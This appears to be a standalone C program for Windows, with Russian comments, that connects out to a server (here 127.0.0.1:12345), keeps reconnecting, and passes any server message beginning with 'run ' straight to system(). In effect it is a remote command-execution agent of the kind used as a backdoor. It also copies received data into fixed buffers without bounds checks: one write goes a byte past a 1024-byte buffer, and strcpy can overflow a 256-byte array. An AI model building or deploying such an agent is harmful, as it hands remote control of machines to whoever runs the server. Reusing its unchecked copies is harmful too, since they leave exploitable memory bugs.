#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024
#define HOST "127.0.0.1"
#define PORT 12345

int main() {
    WSADATA wsaData;
    WORD ver = MAKEWORD(2, 2);

    int wsResult = WSAStartup(ver, &wsaData);
    if (wsResult != 0) {
        printf("WSAStartup failed: %d\n", wsResult);
        return 1;
    }

    SOCKET clientSocket = INVALID_SOCKET;
    while (1) {
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            printf("Socket failed: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        struct sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(PORT);
        InetPton(AF_INET, HOST, &serverAddress.sin_addr);

        int connectResult = connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress));
        if (connectResult == SOCKET_ERROR) {
            printf("Connect failed: %ld\n", WSAGetLastError());
            closesocket(clientSocket);
            Sleep(1000); // ждать 1 секунду перед повторной попыткой
            continue;
        }

        printf("Connected to server.\n");

        char buffer[BUFFER_SIZE];
        while (1) {
            int bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE, 0);
            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                printf("Server: %s\n", buffer);

                // выполнение команды
                if (strncmp(buffer, "run ", 4) == 0) {
                    char command[256];
                    strcpy(command, buffer + 4);
                    printf("Running command: %s\n", command);
                    system(command);
                } else {
                    send(clientSocket, "error", 5, 0);
                }
            } else {
                printf("Connection closed.\n");
                break;
            }
        }

        closesocket(clientSocket);
    }

    WSACleanup();
    return 0;
}